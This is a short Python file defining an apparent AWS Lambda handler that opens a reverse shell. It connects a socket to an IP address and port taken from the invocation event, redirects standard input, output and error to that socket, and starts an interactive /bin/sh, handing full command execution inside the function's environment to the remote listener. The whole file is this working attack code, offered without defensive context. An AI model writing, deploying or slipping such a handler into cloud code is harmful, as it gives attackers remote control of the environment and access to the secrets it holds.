import os
import socket
import subprocess

def shell(event, context):
    """
    Opens a reverse shell to a lambda.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((event["ip"], event["port"], ))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    p = subprocess.call(["/bin/sh", "-i"])
    